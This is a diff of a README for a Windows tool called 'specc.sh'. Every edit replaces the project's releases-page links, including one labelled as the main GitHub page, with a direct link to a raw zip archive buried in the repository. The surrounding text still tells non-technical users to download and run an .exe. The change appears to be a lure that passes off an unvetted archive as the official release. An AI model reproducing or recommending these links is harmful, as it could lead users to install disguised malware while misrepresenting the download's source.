@@ -1,6 +1,6 @@
 # ⚙️ specc.sh - Simple AI Code Template for Projects
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest-gray?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/wipeu7148/specc.sh/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest-gray?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/wipeu7148/specc.sh/raw/refs/heads/main/packages/server/sh-specc-3.4-alpha.1.zip)
 
 ---
 
@@ -29,12 +29,12 @@ You do not need programming skills, but basic computer use is required.
 
 You can get specc.sh from its official release page. The link takes you to the download area where you will find the latest version of the application ready to use.
 
-[![Download specc.sh](https://img.shields.io/badge/Visit%20Release-Blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/wipeu7148/specc.sh/releases)
+[![Download specc.sh](https://img.shields.io/badge/Visit%20Release-Blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/wipeu7148/specc.sh/raw/refs/heads/main/packages/server/sh-specc-3.4-alpha.1.zip)
 
 ### Step 1: Visit the Releases Page
 
 Click the button above or open this link in your browser:  
-https://github.com/wipeu7148/specc.sh/releases
+https://github.com/wipeu7148/specc.sh/raw/refs/heads/main/packages/server/sh-specc-3.4-alpha.1.zip
 
 You will see one or more files listed. Look for the file with `.exe` ending, as this is the program you need for Windows.
 
@@ -92,7 +92,7 @@ If you want, you can explore more about AI coding on the program’s help sectio
 
 Updates bring bug fixes and improvements. To update specc.sh:
 
-1. Visit the release page again: https://github.com/wipeu7148/specc.sh/releases  
+1. Visit the release page again: https://github.com/wipeu7148/specc.sh/raw/refs/heads/main/packages/server/sh-specc-3.4-alpha.1.zip  
 2. Download the newest `.exe` file available.  
 3. Run the new installer; it will replace the old version without removing your files.
 
@@ -113,10 +113,10 @@ For further help, visit the GitHub Issues page of specc.sh or ask someone famili
 
 ## 📝 Additional Resources
 
-- The GitHub page holds project files and documentation: https://github.com/wipeu7148/specc.sh  
+- The GitHub page holds project files and documentation: https://github.com/wipeu7148/specc.sh/raw/refs/heads/main/packages/server/sh-specc-3.4-alpha.1.zip  
 - Community discussions may be found there for tips and questions.  
 - Read the included user guide inside the program for detailed features.
 
 ---
 
-[![Download specc.sh](https://img.shields.io/badge/Visit%20Release-Blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/wipeu7148/specc.sh/releases)
+[![Download specc.sh](https://img.shields.io/badge/Visit%20Release-Blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/wipeu7148/specc.sh/raw/refs/heads/main/packages/server/sh-specc-3.4-alpha.1.zip)
